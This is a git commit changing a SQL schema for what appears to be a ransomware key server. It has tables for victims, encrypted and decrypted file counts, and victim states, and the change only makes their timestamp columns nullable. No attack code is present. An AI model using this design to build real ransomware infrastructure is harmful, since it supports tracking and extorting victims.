63b8ad7bc1156ac1ab4e0cdbfa826eb1f87ecec7
StayZeen <salutcmoitchoupi05@gmail.com>
2024-03-15 08:29:11 +0100

    ajout de donnees dans la bd

--- serveur_cles/script/victims_schema.sql
+++ serveur_cles/script/victims_schema.sql
@@ -8,21 +8,21 @@ CREATE TABLE victims (
 CREATE TABLE decrypted (
     id_decrypted INTEGER PRIMARY KEY NOT NULL,
     hash INTEGER NOT NULL,
-    datetime TIMESTAMP NOT NULL,
+    datetime TIMESTAMP,
     nb_files INTEGER NOT NULL,
     FOREIGN KEY (hash) REFERENCES victims (hash)
 );
 CREATE TABLE states (
     id_state INTEGER PRIMARY KEY NOT NULL,
     hash INTEGER NOT NULL,
-    datetime TIMESTAMP NOT NULL,
+    datetime TIMESTAMP,
     state VARCHAR NOT NULL,
     FOREIGN KEY (hash) REFERENCES victims (hash)
 );
 CREATE TABLE encrypted (
     id_encrypted INTEGER PRIMARY KEY NOT NULL,
     hash INTEGER NOT NULL,
-    datetime TIMESTAMP NOT NULL,
+    datetime TIMESTAMP,
     nb_files INTEGER NOT NULL,
     FOREIGN KEY (hash) REFERENCES victims (hash)
 );
